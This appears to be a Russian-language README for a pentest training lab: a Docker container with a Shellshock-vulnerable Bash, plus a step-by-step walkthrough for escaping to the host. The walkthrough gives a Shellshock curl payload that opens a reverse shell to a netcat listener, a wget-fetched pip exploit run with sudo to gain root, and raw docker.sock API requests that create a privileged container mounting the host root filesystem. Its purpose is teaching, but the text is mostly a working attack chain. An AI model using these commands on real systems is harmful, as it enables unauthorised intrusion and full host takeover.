
# Pentest Docker Step-By-Step

Специально подготовленный контейнер, содержащий в себе уязвимый пакет Bash, позволяющий реализовать Remote Code Execution. Уязвимость более известна как Shellshock

## Установка уязвимого окружения

Чтобы собрать уязвимый образ контейнера

    docker build . -t  vulne-wheezy

Для реализации сцераия необходимо развернуть приложение с подключением docker.sock:

    docker run -v /var/run/docker.sock:/var/run/docker.sock --rm -it -p 8090:80 vulne-wheezy:latest

Вы можете проверить доступность версиса по адресу ```localhost:8080```

## Exploit

Эксплуатация уявзимости состоит из следующих этапов:
- Получение доступа в shell контейнера под пользователем www-data, используя RCE (Shellshock)
- Повышение привилегий до root через FakePip exploit
- Подключение к docker.sock и разворачивание нового контейнера ubuntu с сервисом SSH для дальнейшего подключения (с маунтом /:/host и максимальными привилегиями)
- Создание пользователя hidle на хосте
- Подключение к хосту с новым пользователем
- Разворачивание Wheave Scope

### Эксплуатация Shellcode

Запускаем на машине, к которой мы будем подключаться через reverse-shell netcat:

    nc -l 1337

В новом окне эксплуатируем RCE с указанием IP-адреса, на котором запущен netcat:

    curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'sh -i >& /dev/tcp/<IP-netcat>/1337 0>&1'" http://<IP-target>/cgi-bin/vulnerable
    
## Изучение внутри контейнера

    # информация об ОС внутри контейнера
    cat /etc/os-release
    
    # информация о ядре. На основе этой информации можно начать искать CVE.  
    uname -rv
    uname -a
    
    # пользователь под которым провалились в контейнер
    id

    # просмотр текущих cgroups
    cat /proc/1/cgroup

    #просотр доступных переменных
    env

    # сеть
    ifconfig

    # cмотрим какие mounts были сделаны внутрь контейнера
    cat /proc/mounts

    # смотрим есть ли docker.sock
    cat /proc/mounts | grep docker.sock

    # просмотр прав на docker.sock
    ls -l /var/run/docker.sock
    
Видим, что есть возможность выполнять установку пакетов pip от sudo:

    sudo -l
    
## Повышение привилегий внутри контейнера

Скачиваем exploit для pip в /tmp:

    cd /tmp && wget https://raw.githubusercontent.com/dvyakimov/FakePip/master/setup.py

Меняем IP-адрес на тот, где у вас будет запущен еще один netcat:

    cat setup.py | sed "s/192.168.168.2/IP-netcat/" > setup-new.py && mv setup-new.py setup.py

Открываем в другом терминале, формируя новое подключение

    nc -l 13372

Устанавливаем exploit через pip

    sudo pip install . --upgrade --force-reinstall

Получаем root внутри контейнера

## Смена контейнера

Теперь, когда есть root, доустанавливаем то, что нам может понадобиться. Например, capsh, чтобы узнать Capabilities:

    apt-get update && \
    apt-get install libcap2-bin

Узнаем Capabilities:

    grep Cap /proc/self/status
    capsh --decode=00000000a80425fb   # default запуск
    # capsh --decode=00000000a82425fb # если добавили sys_admin
    # capsh --decode=0000003fffffffff # есть priviliged контейнер

Здесь можно было бы поставить jq и создать контейнер через подключение по curl в docker.sock, но к сожалению на debian 7 curl такой древний, что подключение к unix-сокету не работает)))) Пойдем по пути подключения через netcat. Примеров в Интернете немного, поэтому разбираемся самостоятельно.
Установить пакет, чтобы netcat работал с unix-socket
```
apt-get install netcat netcat-openbsd
```
Теперь можем общаться с unix-socket:
```
echo -e "GET /images/json HTTP/1.0\r\n" | nc -U /var/run/docker.sock
```
Скачиваем необходимый образ. Пусть это будет образ ubuntu с сервисом ssh:
```
nc -U /var/run/docker.sock
POST /v1.39/images/create?fromImage=rastasheep/ubuntu-sshd&tag=14.04 HTTP/1.0
```
Создать новый контейнер ubuntu через docker.sock. Важно, что мы маунтим в папку /host всю директорию root / хоста:
```
request="POST /v1.39/containers/create HTTP/1.0\r\nContent-Type: application/json\r\nContent-Length: 12345\r\n\r\n{\"Image\":\"rastasheep/ubuntu-sshd:14.04\",
\"HostConfig\":{\"Privileged\":true,\"Binds\":[\"/:/host\", \"/dev/log:/dev/log\"]}}" && echo -e $request | nc -U /var/run/docker.sock
```
 На выходе будет id. Запускаем контейнер:
```
request="POST /v1.39/containers/6ea55e38c67ca78251009efbccd90cf8f53f61a9a2b8052e037948dff1b76c13/start HTTP/1.0\r\n\r\n" && echo -e $request | nc -U /var/run/docker.sock
```
Проверим новый контейнер. Здесь же можно увидеть IP адрес в поле "IPAddress":
```
echo -e "GET /images/json HTTP/1.0\r\n" | nc -U /var/run/docker.sock
```
Подключаемся к соданному нами контейнеру (надо понять только как узнать, какой по счету в сетке новый контейнер) - пароль 'root':
```
ssh root@172.17.0.2
```
### Disclaimer

This or previous program is for Educational purpose ONLY. Do not use it without permission. The usual disclaimer applies, especially the fact that me (opsxcq) is not liable for any damages caused by direct or indirect use of the information or functionality provided by these programs. The author or any Internet provider bears NO responsibility for content or misuse of these programs or any derivatives thereof. By using these programs you accept the fact that any damage (dataloss, system crash, system compromise, etc.) caused by the use of these programs is not opsxcq's responsibility.
